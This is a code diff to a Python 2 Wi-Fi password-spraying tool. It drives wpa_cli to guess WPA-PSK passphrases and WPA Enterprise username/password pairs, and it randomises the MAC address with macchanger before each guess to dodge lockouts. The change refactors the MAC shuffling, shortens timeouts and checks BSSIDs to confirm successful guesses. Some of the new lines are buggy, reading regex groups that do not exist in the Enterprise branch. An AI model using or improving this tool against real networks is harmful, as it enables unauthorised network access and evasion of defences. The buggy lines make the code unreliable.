@@ -39,6 +39,15 @@ network_id = wpa_cli.match.group(1)
 wpa_cli.sendline('set_network {0} ssid "{1}"'.format(network_id, ssid))
 wpa_cli.expect('OK')
 
+def mac_shuffle():
+    subprocess.call('ifconfig {0} down'.format(interface), shell=True)
+    sleep(0.25)
+    subprocess.call('macchanger -A {0} > /dev/null'.format(interface), shell=True)
+    sleep(0.25)
+    subprocess.call('ifconfig {0} up'.format(interface), shell=True)
+    sleep(0.50)
+    subprocess.call('iwconfig {0} essid "{1}"'.format(interface, ssid), shell=True)
+
 def cleanup():
     #clean up so we're not spraying login attempts everywhere
     wpa_cli.sendline('remove_network {0}'.format(network_id))
@@ -49,36 +58,38 @@ try:
     if not args.user_file:
         for password in passwords:
             #shuffle MAC address around
-            subprocess.call('ifconfig {0} down'.format(args.interface), shell=True)
-            sleep(0.25)
-            subprocess.call('macchanger -A {0} > /dev/null'.format(interface), shell=True)
-            sleep(0.25)
-            subprocess.call('ifconfig {0} up'.format(args.interface), shell=True)
-            sleep(0.50)
-            subprocess.call('iwconfig {0} essid "{1}"'.format(interface, ssid), shell=True)
+            mac_shuffle()
 
             wpa_cli.sendline('set_network {0} psk "{1}"'.format(network_id, password.rstrip('\n')))
             wpa_cli.expect('OK')
             wpa_cli.sendline('select_network {0}'.format(network_id))
             try:
-                wpa_cli.expect('Trying to associate with ..:..:..:..:..:.. \(SSID=\'(.*)\' freq=[0-9]* MHz\)',
-                               timeout=30)
+                wpa_cli.expect('Trying to associate with (..:..:..:..:..:..) \(SSID=\'(.*)\' freq=[0-9]* MHz\)',
+                               timeout=15)
+                associating_bssid = wpa_cli.match.group(1)
+                associating_ssid = wpa_cli.match.group(2)
             except KeyboardInterrupt:
                     cleanup()
             except:
                 continue
 
             #if the right network wasn't reached, we might be falling back to a previous network
-            if wpa_cli.match.group(1) != ssid:
+            if associating_ssid != ssid:
                 print 'Could not connect to {0}... trying again'.format(ssid)
                 continue
 
             #check results
-            result = wpa_cli.expect(['WPA: 4-Way Handshake failed - pre-shared key may be incorrect',
-                                    'WPA: Key negotiation completed with ..:..:..:..:..:..'], timeout=120)
+            try:
+                result = wpa_cli.expect(['WPA: 4-Way Handshake failed - pre-shared key may be incorrect',
+                                        'WPA: Key negotiation completed with (..:..:..:..:..:..)'], timeout=15)
+                completed_bssid = wpa_cli.match.group(1)
+            except KeyboardInterrupt:
+                cleanup()
+            except:
+                continue
 
             #successful guess
-            if result == 1:
+            if result == 1 and associating_bssid == completed_bssid:
                 exit('Successful connection\nSSID: {0}\nPassphrase: {1}'.format(ssid, password.rstrip('\n')))
 
     #do WPA Enterprise attack
@@ -89,19 +100,15 @@ try:
             wpa_cli.sendline('set_network {0} identity "{1}"'.format(network_id, username.rstrip('\n')))
             for password in passwords:
                 #shuffle MAC address around
-                subprocess.call('ifconfig {0} down'.format(interface), shell=True)
-                sleep(0.25)
-                subprocess.call('macchanger -A {0} > /dev/null'.format(interface), shell=True)
-                sleep(0.25)
-                subprocess.call('ifconfig {0} up'.format(interface), shell=True)
-                sleep(0.50)
-                subprocess.call('iwconfig {0} essid "{1}"'.format(interface, ssid), shell=True)
+                mac_shuffle()
 
                 wpa_cli.sendline('set_network {0} password "{1}"'.format(network_id, password.rstrip('\n')))
                 wpa_cli.sendline('select_network {0}'.format(network_id))
                 try:
                     wpa_cli.expect('Trying to associate with ..:..:..:..:..:.. \(SSID=\'(.*)\' freq=[0-9]* MHz\)',
-                                   timeout=30)
+                                   timeout=15)
+                    associating_bssid = wpa_cli.match.group(1)
+                    associating_ssid = wpa_cli.match.group(1)
                 except KeyboardInterrupt:
                     cleanup()
                 except:
@@ -113,12 +120,18 @@ try:
                     continue
 
                 #check results
-                result = wpa_cli.expect(['CTRL-EVENT-EAP-FAILURE EAP authentication failed',
-                               'CTRL-EVENT-DISCONNECTED bssid=..:..:..:..:..:.. reason=3',
-                               'CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully'], timeout=120)
+                try:
+                    result = wpa_cli.expect(['CTRL-EVENT-EAP-FAILURE EAP authentication failed',
+                                   'CTRL-EVENT-DISCONNECTED bssid=(..:..:..:..:..:..) reason=3',
+                                   'CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully'], timeout=15)
+                    completed_bssid = wpa_cli.match.group(1)
+                except KeyboardInterrupt:
+                    cleanup()
+                except:
+                    continue
 
                 #successful guess
-                if result == 2:
+                if result == 2 and associating_bssid == completed_bssid:
                     print '\'{0}\' : \'{1}\''.format(username.rstrip('\n'), password.rstrip('\n'))
 
 except Exception as e:
